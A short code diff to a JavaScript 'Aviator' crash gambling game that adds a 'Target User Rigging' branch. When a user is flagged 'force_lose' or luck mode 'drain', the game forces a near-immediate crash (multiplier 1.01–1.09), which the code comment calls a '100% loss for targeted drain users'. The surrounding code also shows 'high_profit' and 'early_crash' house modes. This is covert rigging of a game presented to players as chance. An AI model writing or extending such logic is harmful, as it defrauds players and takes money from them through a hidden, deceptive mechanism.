@@ -87,6 +87,11 @@ export default function AviatorGame({ onClose }) {
     const maxMult = gameControl?.gameOverrides?.aviator?.maxMultiplier || gameControl?.maxMultiplier || 3.0;
     const houseMode = gameControl?.houseMode || 'high_profit';
 
+    // Target User Rigging (100% loss for targeted drain users)
+    if (user?.force_result === 'force_lose' || user?.luck_mode === 'drain') {
+      return parseFloat((1.01 + Math.random() * 0.08).toFixed(2));
+    }
+
     if (gameControl?.aviatorMode === 'early_crash' || houseMode === 'emergency_lock') {
       return parseFloat((1.01 + Math.random() * 0.12).toFixed(2));
     }
